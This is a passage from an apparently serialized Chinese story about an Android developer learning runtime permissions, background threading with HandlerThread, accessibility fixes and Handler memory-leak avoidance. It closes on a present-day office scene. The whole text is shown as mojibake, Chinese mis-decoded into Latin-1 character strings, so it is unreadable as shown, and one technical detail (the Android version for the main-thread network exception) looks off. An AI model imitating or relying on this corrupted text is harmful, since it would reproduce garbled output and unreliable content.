<p>å†æ¬¡æµ‹è¯•æ—¶ï¼Œå´©æºƒç‡å¤§å¹…ä¸‹é™ã€‚</p>
<p><strong>Logcat</strong> é‡Œçš„ <code>GC</code> æ—¥å¿—ä¹Ÿå˜å¾—è§„å¾‹èµ·æ¥ã€‚</p>
<p>ä»–çœ‹ç€ <strong>Bugly</strong> åå°å®æ—¶æ›´æ–°çš„ç›‘æ§æ•°æ®ï¼Œç¬¬ä¸€æ¬¡çœŸåˆ‡æ„Ÿå—åˆ°å¼‚å¸¸è¿½è¸ªå·¥å…·å¯¹å¼€å‘çš„é‡è¦æ€§ã€‚</p>
<p>è§£å†³äº†å´©æºƒé—®é¢˜ï¼Œè€æ¨ä»¥ä¸ºç»ˆäºèƒ½æ¾å£æ°”ã€‚</p>
<p>è§£å†³äº†å´©æºƒé—®é¢˜åï¼Œè€æ¨æ€»ç®—è¿æ¥äº†å‡ å¤©çŸ­æš‚çš„ä¼‘æ•´ã€‚</p>
<p>ä»–è¶è¿™æ®µæ—¶é—´æ¢³ç†äº†å•†å“åˆ—è¡¨ä¼˜åŒ–çš„å®Œæ•´æ–¹æ¡ˆï¼Œè¡¥å…¨äº†æŠ€æœ¯æ–‡æ¡£ï¼Œè¿˜å¸®æµ‹è¯•ç»„å¤ç°äº†å‡ ä¸ªé›¶æ˜Ÿçš„å°é—®é¢˜ã€‚</p>
<p>å°±è¿™æ ·å®‰ç¨³è¿‡äº†ä¸€å‘¨ï¼Œæ­£å½“ä»–ä»¥ä¸ºèƒ½å–˜å£æ°”ï¼ŒæŠŠç²¾åŠ›æ”¾åœ¨åç»­çš„åŠŸèƒ½è¿­ä»£ä¸Šæ—¶ï¼Œæ–°çš„ä»»åŠ¡åˆæ¥äº†ã€‚</p>
<p>å®‰å“ç»„ç»„é•¿æ‰¾äº†è¿‡æ¥ï¼Œç»™ä»–å®‰æ’äº†æ–°ä»»åŠ¡ï¼šâ€œç»™å•†å“è¯¦æƒ…é¡µåŠ ä¸ªæ‰«ç åŠŸèƒ½ï¼Œç”¨æˆ·æ‰«å•†å“åŒ…è£…ä¸Šçš„æ¡å½¢ç ï¼Œå°±èƒ½å¿«é€ŸæŸ¥çœ‹å•†å“ä¿¡æ¯ï¼Œè¿™ä¸ªéœ€æ±‚å¾—å°½å¿«è½åœ°ã€‚â€</p>
<p>"è¿™ä¸ªç®€å•ï¼Œè°ƒç”¨ç³»ç»Ÿç›¸æœºæ‰«ç å°±è¡Œã€‚"</p>
<p>è€æ¨ä¿¡å¿ƒæ»¡æ»¡åœ°å¼€å§‹å†™ä»£ç ã€‚</p>
<p>ä»–åœ¨ <code>AndroidManifest.xml</code> é‡Œæ·»åŠ äº† <code>CAMERA</code> æƒé™ï¼Œç„¶åç”¨ <code>Intent</code> è°ƒç”¨ç³»ç»Ÿç›¸æœºåº”ç”¨ï¼Œæƒ³ç€å°±èƒ½ç›´æ¥è·å–æ‰«ç ç»“æœã€‚</p>
<p>å¯æµ‹è¯•æ—¶å´å‘ç°ï¼Œåœ¨ Android 6.0 çš„æœºå‹ä¸Šï¼Œæ‰“å¼€æ‰«ç åŠŸèƒ½æ—¶ç›´æ¥é—ªé€€ã€‚</p>
<p><strong>Logcat</strong> é‡ŒæŠ¥å‡ºæƒé™è¢«æ‹’ç»çš„é”™è¯¯ã€‚</p>
<p>"ä½ ä¸çŸ¥é“ 6.0 å¼€å§‹è¦åŠ¨æ€ç”³è¯·æƒé™å—ï¼Ÿ"</p>
<p>ç‹å“¥è·¯è¿‡ä»–å·¥ä½æ—¶ï¼Œä¸€çœ¼å°±çœ‹å‡ºäº†é—®é¢˜ã€‚</p>
<p>"å±é™©æƒé™ä¸ä»…è¦åœ¨ <code>Manifest</code> é‡Œå£°æ˜ï¼Œè¿˜è¦åœ¨è¿è¡Œæ—¶ç”³è¯·ã€‚"</p>
<p>ä»–æ‰“å¼€è‡ªå·±çš„é¡¹ç›®å·¥ç¨‹ï¼Œç»™è€æ¨æ¼”ç¤ºäº†åŠ¨æ€æƒé™ç”³è¯·çš„ä»£ç ã€‚</p>
<p>"å…ˆç”¨ <code>ContextCompat.checkSelfPermission</code> æ£€æŸ¥æƒé™æ˜¯å¦å·²æˆäºˆï¼Œå¦‚æœæ²¡æˆäºˆï¼Œå†åˆ¤æ–­æ˜¯å¦éœ€è¦å‘ç”¨æˆ·è¯´æ˜ç†ç”±ã€‚"</p>
<p>è€æ¨èµ¶ç´§è¡¥å…¨äº†æƒé™ç”³è¯·çš„ä»£ç ã€‚</p>
<p>ä»–å‘ç°ç‹å“¥ç”¨çš„æ˜¯ <code>ActivityResultLauncher</code> APIï¼Œæ¯”ä¼ ç»Ÿçš„<code>requestPermissions</code> æ–¹æ³•æ›´ç®€æ´ï¼Œè¿˜èƒ½é¿å…å†…å­˜æ³„æ¼ã€‚</p>
<p>ä»–ç…§ç€å®ç°ï¼šå…ˆæ³¨å†Œä¸€ä¸ªæƒé™è¯·æ±‚å¯åŠ¨å™¨ï¼Œè§¦å‘åæ ¹æ®ç”¨æˆ·æˆæƒç»“æœæ‰§è¡Œä¸åŒé€»è¾‘ã€‚</p>
<p>å¯æ–°çš„é—®é¢˜åˆå‡ºç°äº†ï¼šæœ‰äº›ç”¨æˆ·ç¬¬ä¸€æ¬¡æ‹’ç»äº†ç›¸æœºæƒé™ï¼Œç¬¬äºŒæ¬¡æ‰“å¼€æ‰«ç åŠŸèƒ½æ—¶ï¼Œç³»ç»Ÿæ²¡æœ‰å¼¹å‡ºæƒé™ç”³è¯·å¯¹è¯æ¡†ï¼Œç›´æ¥æ‹’ç»äº†æƒé™ã€‚</p>
<p>"è¿™æ—¶å€™è¦è°ƒç”¨ <code>shouldShowRequestPermissionRationale</code> æ–¹æ³•åˆ¤æ–­ã€‚"</p>
<p>ç‹å“¥æé†’ä»–ã€‚</p>
<p>"å¦‚æœè¿”å› <code>true</code>ï¼Œè¯´æ˜ç”¨æˆ·ä¹‹å‰æ‹’ç»è¿‡æƒé™ï¼Œè¿™æ—¶å€™åº”è¯¥å¼¹å‡ºå¯¹è¯æ¡†ï¼Œå‘ç”¨æˆ·è§£é‡Šä¸ºä»€ä¹ˆéœ€è¦ç›¸æœºæƒé™ï¼Œæ¯”å¦‚â€˜éœ€è¦ç›¸æœºæƒé™æ‰èƒ½æ‰«ææ¡å½¢ç ï¼Œå¿«é€ŸæŸ¥çœ‹å•†å“ä¿¡æ¯â€™ã€‚"</p>
<p>"å¦‚æœè¿”å› <code>false</code>ï¼Œè¯´æ˜ç”¨æˆ·æ°¸ä¹…æ‹’ç»äº†ï¼Œå°±å¾—å¼•å¯¼ä»–ä»¬å»ç³»ç»Ÿè®¾ç½®é‡Œæ‰‹åŠ¨å¼€å¯ã€‚"</p>
<p>è€æ¨æŒ‰ç…§ç‹å“¥çš„æç¤ºï¼Œæ·»åŠ äº†æƒé™è¯´æ˜å¯¹è¯æ¡†å’Œè®¾ç½®å¼•å¯¼é¡µé¢ã€‚</p>
<p>æµ‹è¯•æ—¶ï¼Œæ— è®ºç”¨æˆ·æ˜¯é¦–æ¬¡æ‹’ç»è¿˜æ˜¯æ°¸ä¹…æ‹’ç»ï¼Œéƒ½èƒ½å¾—åˆ°æ¸…æ™°çš„æŒ‡å¼•ï¼Œæ‰«ç åŠŸèƒ½çš„ç”¨æˆ·ä½“éªŒå¥½äº†å¾ˆå¤šã€‚</p>
<p>å¯å¤šæœºå‹æµ‹è¯•æ—¶ï¼Œæ–°çš„é—®é¢˜åˆæš´éœ²å‡ºæ¥ï¼šåœ¨ Android 4.0 åŠä»¥ä¸Šç‰ˆæœ¬çš„æœºå‹ä¸Šï¼Œæ‰«ç æˆåŠŸååŠ è½½å•†å“ä¿¡æ¯ä¼šç›´æ¥é—ªé€€ï¼Œ<strong>Logcat</strong> é‡Œæ˜ç¡®æŠ¥å‡º <code>NetworkOnMainThreadException</code> å¼‚å¸¸ï¼›è€Œåœ¨4.0ä»¥ä¸‹çš„æ—§æœºå‹ä¸Šï¼Œè™½ä¸ä¼šå´©æºƒï¼Œä½†ç½‘ç»œä¸å¥½æ—¶ä¼šå‡ºç°æ˜æ˜¾çš„UIå¡é¡¿ï¼Œå±å¹•åƒµä½å¥½å‡ ç§’æ— å“åº”ï¼Œè¿è¿”å›æŒ‰é’®éƒ½å¤±çµã€‚</p>
<p>"è¿™æ˜¯å› ä¸ºä½ åœ¨ä¸»çº¿ç¨‹åšäº†ç½‘ç»œè¯·æ±‚ã€‚"</p>
<p>ç‹å“¥æ•²äº†æ•²ä»–çš„å±å¹•ã€‚</p>
<p>"è€—æ—¶æ“ä½œä¸€å®šè¦æ”¾åœ¨å­çº¿ç¨‹é‡Œã€‚è¯•è¯•ç”¨ <code>HandlerThread</code> ã€‚"</p>
<p>ç‹å“¥ç»™è€æ¨æ¼”ç¤ºäº† <code>HandlerThread</code> çš„ç”¨æ³•ã€‚</p>
<p>åˆ›å»ºä¸€ä¸ª <code>HandlerThread</code> å®ä¾‹ï¼Œè°ƒç”¨ <code>start</code> æ–¹æ³•å¯åŠ¨çº¿ç¨‹ã€‚</p>
<p>ç„¶ååˆ›å»ºä¸€ä¸ª <code>WorkerHandler</code>ï¼ŒæŠŠå®ƒç»‘å®šåˆ° <code>HandlerThread</code> çš„ <code>Looper</code> ä¸Šã€‚</p>
<p>è€—æ—¶çš„ç½‘ç»œè¯·æ±‚æ”¾åœ¨ <code>WorkerHandler</code> çš„ <code>post</code> æ–¹æ³•é‡Œæ‰§è¡Œï¼Œè·å–åˆ°æ•°æ®åï¼Œå†é€šè¿‡ <code>MainHandler</code> åˆ‡æ¢åˆ°ä¸»çº¿ç¨‹æ›´æ–° <code>UI</code>ã€‚</p>
<p>è€æ¨ç…§ç€ç‹å“¥çš„æ–¹æ³•ä¿®æ”¹ä»£ç ã€‚</p>
<p>ä»–è¿˜ç‰¹æ„åœ¨ <code>Activity</code> é”€æ¯æ—¶ï¼Œè°ƒç”¨äº† <code>HandlerThread.quitSafely()</code> æ–¹æ³•â€”â€”è¦çŸ¥é“ <code>quit</code> ä¼šç›´æ¥ç»ˆæ­¢çº¿ç¨‹çš„ <code>Looper</code>ï¼Œä¸¢å¼ƒé˜Ÿåˆ—ä¸­æœªæ‰§è¡Œçš„æ¶ˆæ¯ï¼Œå®¹æ˜“å¯¼è‡´æ•°æ®ä¸¢å¤±æˆ–èµ„æºæœªé‡Šæ”¾ï¼›è€Œ <code>quitSafely</code> ä¼šç­‰å¾…é˜Ÿåˆ—ä¸­å·²æœ‰çš„æ¶ˆæ¯æ‰§è¡Œå®Œæ¯•åå†ç»ˆæ­¢ <code>Looper</code>ï¼Œæ—¢èƒ½æ­£å¸¸ç»“æŸçº¿ç¨‹ï¼Œåˆèƒ½é¿å…å†…å­˜æ³„æ¼å’Œæ•°æ®å¼‚å¸¸ã€‚</p>
<p>ä»–è¿˜åœ¨ä»£ç é‡Œæ·»åŠ äº†è¯¦ç»†çš„ <code>Log</code> æ—¥å¿—ï¼Œç”¨ä¸åŒçš„æ—¥å¿—çº§åˆ«åŒºåˆ†è°ƒè¯•ä¿¡æ¯å’Œé”™è¯¯ä¿¡æ¯ï¼Œæ–¹ä¾¿åç»­é€šè¿‡ <strong>Logcat</strong> æ’æŸ¥é—®é¢˜ã€‚</p>
<p>æµ‹è¯•æ—¶ï¼Œæ‰«ç åŠ è½½å•†å“ä¿¡æ¯çš„è¿‡ç¨‹ä¸­ï¼Œ<code>UI</code> å†ä¹Ÿä¸å¡é¡¿äº†ã€‚</p>
<p>å³ä½¿ç½‘ç»œä¸å¥½ï¼Œä¹Ÿåªä¼šæ˜¾ç¤ºåŠ è½½ä¸­åŠ¨ç”»ï¼Œä¸ä¼šå½±å“å…¶ä»–æ“ä½œã€‚</p>
<p>é¡¹ç›®æ¨è¿›åˆ°åæœŸï¼Œå…¬å¸ç»„ç»‡äº†ä¸€æ¬¡æ— éšœç¢æµ‹è¯•ã€‚</p>
<p>æµ‹è¯•äººå‘˜åé¦ˆï¼Œè§†éšœç”¨æˆ·ä½¿ç”¨ <code>TalkBack</code> æ—¶ï¼Œæ— æ³•è¯†åˆ«æ‰«ç æŒ‰é’®å’Œå•†å“å›¾ç‰‡ï¼Œè€Œä¸”è°ƒæ•´ç³»ç»Ÿå­—ä½“å¤§å°æ—¶ï¼Œ<code>APP</code> é‡Œçš„æ–‡æœ¬å¤§å°ä¸ä¼šè·Ÿç€å˜åŒ–ã€‚</p>
<p>"æ— éšœç¢æ˜¯å¿…é¡»è¦é€‚é…çš„ï¼Œä¸ç„¶ä¼šæµå¤±ä¸€éƒ¨åˆ†ç”¨æˆ·ã€‚"</p>
<p>ç‹å“¥æŠŠæ— éšœç¢æµ‹è¯•æŒ‡å—æ‰”ç»™è€æ¨ã€‚</p>
<p>"ç»™æ‰€æœ‰ <code>UI</code> å…ƒç´ æ·»åŠ å†…å®¹æè¿°ï¼Œè£…é¥°æ€§çš„å…ƒç´ å°±æŠŠ <code>contentDescription</code> è®¾ä¸º<code>null</code>ã€‚"</p>
<p>"æ–‡æœ¬å¤§å°è¦ç”¨ <code>sp</code> ä½œä¸ºå•ä½ï¼Œè¿™æ ·æ‰èƒ½è·Ÿéšç³»ç»Ÿå­—ä½“å¤§å°å˜åŒ–ã€‚"</p>
<p>è€æ¨èµ¶ç´§ä¿®æ”¹ä»£ç ã€‚</p>
<p>ä»–ç»™æ‰«ç æŒ‰é’®æ·»åŠ äº†"ç‚¹å‡»æ‰«ç æŸ¥çœ‹å•†å“ä¿¡æ¯"çš„ <code>contentDescription</code>ï¼Œç»™å•†å“å›¾ç‰‡æ·»åŠ äº†å¯¹åº”çš„å•†å“åç§°æè¿°ã€‚</p>
<p>æŠŠæ‰€æœ‰ <code>TextView</code> çš„ <code>textSize</code> å±æ€§éƒ½ä» <code>dp</code> æ”¹æˆäº† <code>sp</code>ã€‚</p>
<p>ä»–è¿˜ä½¿ç”¨ Android Studio çš„æ— éšœç¢æ‰«æå™¨æ£€æŸ¥äº†ä¸€éï¼Œä¿®å¤äº†ç„¦ç‚¹å¯¼èˆªä¸é¡ºç•…çš„é—®é¢˜ã€‚</p>
<p>å†æ¬¡æµ‹è¯•æ—¶ï¼Œè§†éšœç”¨æˆ·èƒ½é€šè¿‡ <code>TalkBack</code> æ­£å¸¸æ“ä½œï¼Œæ–‡æœ¬å¤§å°ä¹Ÿèƒ½è·Ÿéšç³»ç»Ÿè®¾ç½®å˜åŒ–äº†ã€‚</p>
<p>å°±åœ¨é¡¹ç›®å³å°†ä¸Šçº¿çš„æ—¶å€™ï¼Œå…¬å¸çªç„¶ç»„ç»‡äº†ä¸€æ¬¡ä»£ç è¯„å®¡ã€‚</p>
<p>è¯„å®¡ä¼šä¸Šï¼Œç‹å“¥æŒ‡å‡ºäº†è€æ¨ä»£ç é‡Œçš„ä¸€ä¸ªé—®é¢˜ï¼šä»–åœ¨ä½¿ç”¨ <code>Handler</code> æ—¶ï¼Œç›´æ¥ç”¨äº†åŒ¿åå†…éƒ¨ç±»ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼ã€‚</p>
<p>"åŒ¿åå†…éƒ¨ç±»ä¼šæŒæœ‰å¤–éƒ¨ <code>Activity</code> çš„å¼•ç”¨ï¼Œ"</p>
<p>ç‹å“¥è§£é‡Šé“ã€‚</p>
<p>"å¦‚æœ <code>Handler</code> é‡Œè¿˜æœ‰æœªæ‰§è¡Œçš„æ¶ˆæ¯ï¼Œ<code>Activity</code> å°±æ— æ³•è¢« <code>GC</code> å›æ”¶ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼ã€‚"</p>
<p>ä»–ç»™è€æ¨æ¼”ç¤ºäº†æ­£ç¡®çš„ç”¨æ³•ï¼šç”¨é™æ€å†…éƒ¨ç±»å®šä¹‰ <code>Handler</code>ï¼Œç„¶åç”¨ <code>WeakReference</code> å¼•ç”¨å¤–éƒ¨<code>Activity</code>ï¼›åœ¨ <code>Activity</code> é”€æ¯æ—¶ï¼Œç§»é™¤ <code>Handler</code> é‡Œçš„æ‰€æœ‰æ¶ˆæ¯å’Œå›è°ƒã€‚"</p>
<p>è€æ¨èµ¶ç´§ä¿®æ”¹ä»£ç ã€‚</p>
<p>æŠŠæ‰€æœ‰çš„<code>Handler</code> éƒ½æ”¹æˆäº†é™æ€å†…éƒ¨ç±»çš„å½¢å¼ï¼Œè¿˜æ·»åŠ äº† <code>WeakReference</code>ã€‚</p>
<p>ç‰¹æ„åœ¨ <code>onDestroy</code> æ–¹æ³•é‡Œï¼Œè°ƒç”¨äº† <code>handler.removeCallbacksAndMessages(null)</code>ï¼Œç¡®ä¿ç§»é™¤æ‰€æœ‰æœªæ‰§è¡Œçš„æ¶ˆæ¯å’Œå›è°ƒã€‚</p>
<p>åŒæ—¶ï¼Œä»–è¿˜è¡¥å……äº†å•å…ƒæµ‹è¯•ï¼Œè¦†ç›–äº† <code>SparseArray</code> ä¼˜åŒ–ã€æƒé™ç”³è¯·ã€å¼‚å¸¸å¤„ç†ç­‰æ ¸å¿ƒé€»è¾‘ï¼Œç¡®ä¿ä»£ç çš„ç¨³å®šæ€§ã€‚</p>
<p>ä»£ç è¯„å®¡é€šè¿‡åï¼Œé¡¹ç›®ç»ˆäºé¡ºåˆ©ä¸Šçº¿ã€‚</p>
<p>ä¸Šçº¿é‚£å¤©ï¼Œè€æ¨ç›¯ç€ <strong>Bugly</strong> åå°çš„ç›‘æ§æ•°æ®ï¼Œå¿ƒé‡Œæ»¡æ˜¯æ¿€åŠ¨ã€‚</p>
<p>ç”¨æˆ·åé¦ˆå•†å“åˆ—è¡¨å¡é¡¿é—®é¢˜è§£å†³äº†ï¼Œé—ªé€€ç‡ä¹Ÿé™åˆ°äº†0.001%ä»¥ä¸‹ã€‚</p>
<p>æ‰«ç åŠŸèƒ½å’Œæ— éšœç¢é€‚é…éƒ½å¾—åˆ°äº†ç”¨æˆ·çš„è®¤å¯ã€‚</p>
<p>ç‹å“¥æ‹ç€ä»–çš„è‚©è†€ï¼Œç¬‘ç€è¯´ï¼š"ä¸é”™å•Šå°ä¼™å­ï¼Œå…¥èŒè¿™ä¹ˆçŸ­æ—¶é—´ï¼Œå°±èƒ½ç‹¬å½“ä¸€é¢äº†ã€‚"</p>
<p>å°±è¿™æ ·åœ¨ä¸€æ¬¡æ¬¡é¡¹ç›®æ”»åšã€ä¸€æ¬¡æ¬¡è¸©å‘å¡«å‘çš„åƒé”¤ç™¾ç‚¼ä¸­ï¼Œè€æ¨æ‰ç®—æ˜¯åœ¨æ·˜ä¸€æ·˜å®¢æˆ·ç«¯æŠ€æœ¯éƒ¨ç«™ç¨³äº†è„šè·Ÿã€‚</p>
<p>ä»–è·Ÿç€ç‹å“¥å‚ä¸äº†æ›´å¤šçš„é¡¹ç›®ï¼ŒæŠŠ <code>SparseArray</code> çš„å†…å­˜ä¼˜åŒ–æ€è·¯ç”¨åˆ°äº†æ›´å¤šåœºæ™¯ã€‚</p>
<p>ä¹Ÿç†Ÿç»ƒæŒæ¡äº†è¿è¡Œæ—¶æƒé™çš„å„ç§é€‚é…æŠ€å·§ã€‚</p>
<p>ä»–å­¦ä¼šäº†ç”¨ <code>Looper</code>ã€<code>Handler</code>ã€<code>HandlerThread</code> æ­å»ºé«˜æ•ˆçš„å¼‚æ­¥ä»»åŠ¡æ¡†æ¶ã€‚</p>
<p>ç”¨ <strong>Logcat</strong> å’Œ <strong>Bugly</strong> ç»„åˆæ’æŸ¥å„ç§å¼‚å¸¸é—®é¢˜ã€‚</p>
<p>é€šè¿‡ <code>buildTypes</code> é…ç½®æ¸…æ™°åŒºåˆ†ç”Ÿäº§ä¸æµ‹è¯•ç¯å¢ƒï¼ˆæ§åˆ¶ <code>Log</code> æ—¥å¿—è¾“å‡ºã€æœåŠ¡å™¨åœ°å€ç­‰ï¼‰ã€‚</p>
<p>ä¹Ÿæ·±åˆ»ç†è§£äº†æ— éšœç¢é€‚é…å¯¹ç”¨æˆ·ä½“éªŒçš„é‡è¦æ€§ã€‚</p>
<p>åœ¨æ·˜ä¸€æ·˜çš„å‡ å¹´é‡Œï¼Œè€æ¨ä»ä¸€ä¸ªé’æ¶©çš„åº”å±Šç”Ÿï¼Œæˆé•¿ä¸ºä¸€åèµ„æ·±çš„ Android å¼€å‘å·¥ç¨‹å¸ˆã€‚</p>
<p>ä»–ç»å†è¿‡ç´§æ€¥é¡¹ç›®çš„é€šå®µåŠ ç­ï¼Œä¹Ÿæ„Ÿå—è¿‡è§£å†³éš¾é¢˜åçš„æˆå°±æ„Ÿã€‚</p>
<p>ä»–é‡åˆ°è¿‡ä¸¥æ ¼çš„ä»£ç è¯„å®¡ï¼Œä¹Ÿå¾—åˆ°è¿‡å‰è¾ˆçš„æ‚‰å¿ƒæŒ‡å¯¼ã€‚</p>
<p>é‚£äº›å†™è¿‡çš„ä»£ç ã€è¸©è¿‡çš„å‘ã€è§£å†³è¿‡çš„ Bugï¼Œéƒ½å˜æˆäº†ä»–æœ€å®è´µçš„è´¢å¯Œã€‚</p>
<p>å°¤å…¶æ˜¯ç‹å“¥å¸¸è¯´çš„é‚£å¥è¯ï¼Œä»–ä¸€ç›´è®°åœ¨å¿ƒé‡Œã€‚</p>
<p>"å¥½çš„å¼€å‘ä¸ä»…è¦å®ç°åŠŸèƒ½ï¼Œè¿˜è¦è€ƒè™‘æ€§èƒ½ã€ç¨³å®šæ€§å’Œç”¨æˆ·ä½“éªŒï¼Œæ¯ä¸€ä¸ªæŠ€æœ¯ç‚¹çš„é€‰æ‹©ï¼Œéƒ½è¦ç»å¾—èµ·åœºæ™¯çš„è€ƒéªŒã€‚"</p>
<p>......</p>
<p>è€æ¨çš„æ€ç»ªæ¸æ¸æ‹‰å›ç°å®ã€‚</p>
<p>æªç“·æ¯é‡Œçš„å’–å•¡å·²ç»å‡‰é€äº†ã€‚</p>
<p>å°å®‰å’Œæ™“é›…ã€é˜¿æ³½ã€åšæ–‡è¿˜å›´åœ¨ä»–çš„å·¥ä½æ—ï¼Œçœ¼ç¥é‡Œæ»¡æ˜¯ä¸“æ³¨ã€‚</p>
<p>"æ‰€ä»¥å•Šï¼Œæ—å“ç°åœ¨é‡åˆ°çš„ç´§æ€¥é¡¹ç›®ï¼Œå¯¹ä»–æ¥è¯´ä¹Ÿæ˜¯ä¸ªæˆé•¿çš„æœºä¼šã€‚"</p>
<p>è€æ¨çš„å£°éŸ³å¸¦ç€å‡ åˆ†æ„Ÿæ…¨ã€‚</p>
<p>"å½“å¹´æˆ‘è¦æ˜¯æ²¡ç»å†é‚£äº›ç´§æ€¥ä»»åŠ¡ï¼Œä¹Ÿå­¦ä¸ä¼šæŠŠ <code>SparseArray</code>ã€æƒé™é€‚é…ã€å¼‚å¸¸è¿½è¸ªè¿™äº›æŠ€æœ¯ç‚¹èä¼šè´¯é€šã€‚"</p>
<p>åšæ–‡ä¼¼æ‡‚éæ‡‚åœ°ç‚¹ç‚¹å¤´ã€‚</p>
<p>è€æ¨ç¬‘äº†ç¬‘ã€‚</p>
<p>"æŠ€æœ¯ä»æ¥ä¸æ˜¯å­¤ç«‹çš„ã€‚ä½ ç”¨ <code>SparseArray</code> ä¼˜åŒ–å†…å­˜ï¼Œå°±å¾—çŸ¥é“æ€ä¹ˆç”¨ <strong>Logcat</strong> æŸ¥ <code>GC</code> æ—¥å¿—ï¼›ä½ åšæ‰«ç åŠŸèƒ½ï¼Œå°±å¾—æ‡‚åŠ¨æ€æƒé™ç”³è¯·ï¼›ä½ å†™å¼‚æ­¥ä»»åŠ¡ï¼Œå°±å¾—å­¦ä¼šç”¨ <code>HandlerThread</code> é¿å…å†…å­˜æ³„æ¼ã€‚â€</p>
<p>ä»–é¡¿äº†é¡¿ã€‚</p>
<p>â€œå“¦ï¼Œå¯¹ï¼Œä¸è¿‡æ”¾åˆ°ç°åœ¨ï¼Œå¼‚æ­¥ä»»åŠ¡å¤§å¤šç”¨Kotlinåç¨‹æ¥è§£å†³äº†ï¼Œå¾ˆå°‘æœ‰äººå†ç”¨ <code>HandlerThread</code> äº†ã€‚"</p>
<p>ä»–ç»§ç»­ï¼ŒæŒ‡ç€åšæ–‡çš„ä»£ç ã€‚</p>
<p>"ä½ å†æŠŠ <strong>Bugly</strong> çš„ç®€å•é›†æˆå’Œ <code>try-catch</code> å¼‚å¸¸æ•è·åŠ ä¸Šï¼Œæ¨¡æ‹Ÿä¸€ä¸‹ç”Ÿäº§ç¯å¢ƒçš„å¼‚å¸¸åœºæ™¯ï¼Œè¿™æ ·è¿™ä¸ªç»ƒä¹ é¡¹ç›®å°±æ›´å®Œæ•´äº†ã€‚"</p>
<p>å°å®‰çš„çœ‰å¤´ç»ˆäºèˆ’å±•äº†ä¸€äº›ã€‚</p>
<p>"æ¨å“¥ï¼Œå¬ä½ è¿™ä¹ˆä¸€è¯´ï¼Œæˆ‘å°±æ”¾å¿ƒäº†ã€‚æ—å“ä»–è‚¯å®šèƒ½é¡ºåˆ©å®Œæˆä»»åŠ¡çš„ã€‚"</p>
<p>è€æ¨ç‚¹ç‚¹å¤´ï¼Œæ‰“å¼€Qä¹¦ï¼Œç»™æ—å“å‘äº†ä¸€æ¡æ¶ˆæ¯ã€‚</p>
<p>"é‡åˆ°é—®é¢˜åˆ«æ…Œï¼Œå…ˆæ²‰ä¸‹å¿ƒæ¢³ç†æ¸…æ¥šæ ¸å¿ƒé€»è¾‘â€”â€”ä¼˜å…ˆå®šä½é—®é¢˜æ ¹æºï¼Œå†æ‰¾å¯¹åº”è§£å†³æ–¹æ¡ˆï¼Œå¤æ‚ä»»åŠ¡æ‹†åˆ†æˆå°æ­¥éª¤æ¥æ”»å…‹ã€‚å½“å¹´æˆ‘åœ¨æ·˜ä¸€æ·˜æ•‘æ€¥ï¼Œå…¨é å‰è¾ˆæŒ‡ç‚¹è¿™äº›é€šç”¨çš„å¼€å‘æ€è·¯ï¼Œä½ æŒ‰è¿™ä¸ªèŠ‚å¥æ¥ï¼Œæ²¡é—®é¢˜çš„ã€‚"</p>
<p>å‘é€å®Œæ¯•ï¼Œä»–åˆè½¬å¤´å¯¹æ™“é›…ã€é˜¿æ³½ã€åšæ–‡è¯´ï¼š"æˆ‘æŠŠå½“å¹´åœ¨æ·˜ä¸€æ·˜è¸©è¿‡çš„å‘ï¼Œè¿˜æœ‰è¿™äº›æ ¸å¿ƒæŠ€æœ¯ç‚¹çš„æœ€ä½³å®è·µæ•´ç†æˆäº†ä¸ªäººç»éªŒæ–‡æ¡£ï¼Œç­‰ä¸‹å‘ç»™ä½ ä»¬ï¼Œçœå¾—ä½ ä»¬ä»¥åå†èµ°å¼¯è·¯ã€‚"</p>
<p>è¯éŸ³åˆšè½ï¼Œè€æ¨ä¾¿æ‰“å¼€ç”µè„‘æ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°é‚£ä»½æ•´ç†å¥½çš„ä¸ªäººç»éªŒæ–‡æ¡£ã€‚</p>
<p>ä»–é€šè¿‡Qä¹¦ç¾¤å‘ç»™äº†ä»–ä»¬ã€‚</p>
<p>å°å®‰ç«™åœ¨ä¸€æ—ï¼Œçœ‹ç€è¿™ä¸€å¹•ï¼Œç´§ç»·çš„è‚©è†€å½»åº•æ”¾æ¾ä¸‹æ¥ã€‚</p>
<p>é˜³å…‰é€è¿‡è½åœ°çª—æ´’åœ¨åŠå…¬åŒºçš„åœ°æ¿ä¸Šï¼Œä¹Ÿç…§äº®äº†å‡ äººä¸“æ³¨çš„è„¸åºã€‚</p>
<p>è€æ¨çœ‹ç€çœ¼å‰å……æ»¡æœæ°”çš„å®ä¹ ç”Ÿä»¬ï¼Œä»¿ä½›çœ‹åˆ°äº†å½“å¹´åˆå…¥èŒåœºçš„è‡ªå·±ã€‚</p>
<p>è€Œå°å®‰çš„ç›®å…‰ï¼Œæ­£æ¸©æŸ”åœ°æœ›å‘åŠå…¬åŒºå…¥å£çš„æ–¹å‘ï¼ŒæœŸå¾…ç€æ—å“å½’æ¥çš„èº«å½±ã€‚</p>
<p>æ²‰é»˜ç‰‡åˆ»ã€‚</p>
<p>å°å®‰åƒæ˜¯å¿½ç„¶æƒ³èµ·ä»€ä¹ˆï¼Œè½»å£°é—®è€æ¨ï¼š"æ¨å“¥ï¼Œå¬ä½ è®²å½“å¹´åœ¨æ·˜ä¸€æ·˜çš„ç»å†ï¼Œä½ æŠ€æœ¯è¿™ä¹ˆå¥½ï¼Œè¿˜èƒ½ç‹¬å½“ä¸€é¢ï¼Œåæ¥æ€ä¹ˆä¼šæ¥å’±ä»¬ ByteFlow å‘¢ï¼Ÿ"</p>
<p>è€æ¨é—»è¨€ï¼Œæ‹¿èµ·æ¡Œä¸Šæ—©å·²å‡‰é€çš„æªç“·æ¯æŠ¿äº†ä¸€å£ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93bca8c26ab0459e9dc5b6b62b05b6ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767659412&amp;x-signature=4nDIS3C7BHMjvFWq5wSO94IlOEA%3D" alt="2.png" loading="lazy"/></p>
<p>ä»–å˜´è§’å‹¾èµ·ä¸€æŠ¹æ„å‘³æ·±é•¿çš„ç¬‘ã€‚</p>
